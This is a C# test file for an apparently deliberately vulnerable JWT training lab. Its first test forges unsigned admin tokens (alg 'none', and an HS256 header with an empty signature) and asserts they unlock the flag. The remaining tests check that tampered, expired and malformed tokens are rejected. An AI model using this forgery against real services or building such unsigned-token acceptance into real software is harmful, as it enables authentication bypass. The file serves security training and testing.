using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc.Testing;
using Trainer.Web.Core;

namespace Trainer.Web.Tests;

public class JwtLabTests(WebApplicationFactory<Program> factory) : LabTestBase(factory, "jwt")
{
    private string WesleyToken => Lab.DefaultRequest.Headers["Authorization"]["Bearer ".Length..];

    [Theory]
    [InlineData("""{"alg":"none","typ":"JWT"}""")]
    [InlineData("""{"alg":"HS256","typ":"JWT"}""")]   // the reject-alg-none bypass
    public async Task Exploit_unsigned_admin_token_opens_the_bridge(string header)
    {
        var token = $"{Base64Url.Encode(header)}.{Base64Url.Encode("""{"sub":"wesley","name":"Wesley Crusher","role":"admin"}""")}.";

        var bridge = await With(token).GetFromJsonAsync<JsonElement>($"{Api}/admin/bridge");

        Assert.Equal(Flag, bridge.GetProperty("bridgeCode").GetString());
    }

    [Fact]
    public async Task Wesleys_real_token_works_but_is_not_admin()
    {
        var client = With(WesleyToken);
        var me = await client.GetFromJsonAsync<JsonElement>($"{Api}/me");

        Assert.Equal("crew", me.GetProperty("role").GetString());
        Assert.Equal(HttpStatusCode.Forbidden, (await client.GetAsync($"{Api}/admin/bridge")).StatusCode);
    }

    [Fact]
    public async Task Edited_payload_with_old_signature_is_rejected()
    {
        var parts = WesleyToken.Split('.');
        var forged = $"{parts[0]}.{Base64Url.Encode("""{"sub":"wesley","role":"admin"}""")}.{parts[2]}";

        Assert.Equal(HttpStatusCode.Unauthorized, (await With(forged).GetAsync($"{Api}/admin/bridge")).StatusCode);
    }

    [Fact]
    public async Task Expired_and_garbage_tokens_are_rejected()
    {
        var expired = $"{Base64Url.Encode("""{"alg":"none"}""")}.{Base64Url.Encode("""{"role":"admin","exp":1000}""")}.";

        Assert.Equal(HttpStatusCode.Unauthorized, (await With(expired).GetAsync($"{Api}/admin/bridge")).StatusCode);
        Assert.Equal(HttpStatusCode.Unauthorized, (await With("not-a-jwt").GetAsync($"{Api}/me")).StatusCode);
        Assert.Equal(HttpStatusCode.Unauthorized, (await Client(null).GetAsync($"{Api}/me")).StatusCode);
    }

    [Fact]
    public async Task Reset_rotates_the_key_and_invalidates_old_tokens()
    {
        var old = WesleyToken;
        Lab.Reset();

        Assert.Equal(HttpStatusCode.Unauthorized, (await With(old).GetAsync($"{Api}/me")).StatusCode);
        Assert.Equal(HttpStatusCode.OK, (await With(WesleyToken).GetAsync($"{Api}/me")).StatusCode);
    }

    private HttpClient With(string token)
    {
        var client = Client(null);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
        return client;
    }
}
